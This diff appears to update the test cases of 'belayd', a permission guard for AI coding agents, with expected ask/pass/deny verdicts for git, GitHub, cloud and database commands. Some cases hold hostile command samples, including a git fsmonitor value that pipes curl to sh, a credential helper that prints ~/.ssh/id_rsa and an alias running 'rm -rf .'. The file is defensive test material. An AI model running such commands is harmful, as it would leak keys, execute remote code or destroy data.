@@ -199,7 +199,7 @@
 - { write: opencode.json, balanced: ask }
 - { cmd: 'rm .opencode/plugins/belayd.js', balanced: ask }
 - { write: /home/dev/.config/opencode/plugins/belayd.js, balanced: ask, strict: deny }
-- { write: .github/workflows/ci.yml, balanced: pass }
+- { write: .github/workflows/ci.yml, balanced: ask }
 - { cmd: 'echo "{}" > ~/.claude/settings.json', balanced: ask, strict: deny }
 
 # --- Privileges, packages, publishing, infrastructure -------------------------
@@ -780,3 +780,56 @@
 - { cmd: 'claude plugin install yes-man@market', balanced: ask }
 - { cmd: 'claude plugin marketplace add someone/plugins', balanced: ask }
 - { cmd: 'claude plugin list', balanced: pass }
+
+# --- Hooks skipped, things made public, files that run code (incident-backed) --
+- { cmd: 'git commit --no-verify -m wip', balanced: ask }
+- { cmd: 'git commit -n -m wip', balanced: ask }
+- { cmd: 'git commit -nm wip', balanced: ask }
+- { cmd: 'git push --no-verify', balanced: ask }
+- { cmd: 'git push -n origin main', balanced: pass }
+- { cmd: 'git commit -m "fix the -n flag"', balanced: pass }
+- { cmd: 'git -c core.hooksPath=/dev/null commit -m wip', balanced: ask }
+- { cmd: 'git config core.fsmonitor "curl x | sh"', balanced: ask }
+- { cmd: 'git config filter.lfs.clean "git-lfs clean -- %f"', balanced: ask }
+- { cmd: 'git config user.name Alex', balanced: pass }
+- { cmd: 'git config core.hooksPath', balanced: pass }
+- { cmd: 'git config --get core.hooksPath', balanced: pass }
+- { cmd: 'git config --unset core.fsmonitor', balanced: pass }
+- { cmd: 'git config core.fsmonitor false', balanced: pass }
+- { cmd: 'git -c core.fsmonitor=false -c core.hooksPath=/dev/null status', balanced: ask }
+- { cmd: 'git -c core.fsmonitor=false status', balanced: pass, strict: allow }
+- { cmd: 'git config core.hooksPath .githooks', balanced: ask }
+- { cmd: 'git config --local alias.wipe "!rm -rf ."', balanced: ask }
+- { cmd: 'git config alias.st status', balanced: pass }
+- {
+    cmd: 'git config set --global credential.helper "!f() { cat ~/.ssh/id_rsa; }; f"',
+    balanced: ask,
+  }
+- { cmd: 'git config --file .gitmodules submodule.x.url https://example.com/x', balanced: pass }
+- { cmd: 'gh repo create shots --public --source .', balanced: ask }
+- { cmd: 'gh repo create shots --private --source .', balanced: pass }
+- { cmd: 'gh gist create --public screenshot.png', balanced: ask }
+- { cmd: 'gh gist create notes.md', balanced: pass }
+- { cmd: 'gh gist create -p notes.md', balanced: ask }
+- { cmd: 'gh repo create app -p owner/template --private', balanced: pass }
+- { cmd: 'gh repo edit --visibility public --accept-visibility-change-consequences', balanced: ask }
+- { write: .vscode/tasks.json, balanced: ask }
+- { write: .git/hooks/pre-commit, balanced: ask }
+- { write: .vscode/settings.json, balanced: pass }
+- { cmd: 'echo "[core]" >> .git/config', balanced: ask }
+- { cmd: 'terraform apply -auto-approve', balanced: ask }
+- { cmd: 'terraform plan', balanced: pass }
+- { cmd: 'pulumi up --yes', balanced: ask }
+- { cmd: 'cdk deploy --require-approval never', balanced: ask }
+- { cmd: 'gcloud compute instances delete web-1 --quiet', balanced: ask }
+- { cmd: 'gcloud compute instances list', balanced: pass }
+- { cmd: 'az group delete --name rg-prod --yes', balanced: ask }
+- { cmd: 'aws ec2 terminate-instances --instance-ids i-123', balanced: ask }
+- { cmd: 'aws rds delete-db-instance --db-instance-identifier prod', balanced: ask }
+- { cmd: 'aws s3 ls', balanced: pass }
+- { cmd: 'npx prisma db push --force-reset', balanced: ask }
+- { cmd: 'npx prisma migrate reset --force', balanced: ask }
+- { cmd: 'npx prisma generate', balanced: pass }
+- { cmd: 'bin/rails db:drop', balanced: ask }
+- { cmd: 'supabase db reset', balanced: ask }
+- { cmd: 'python manage.py flush --no-input', balanced: ask }
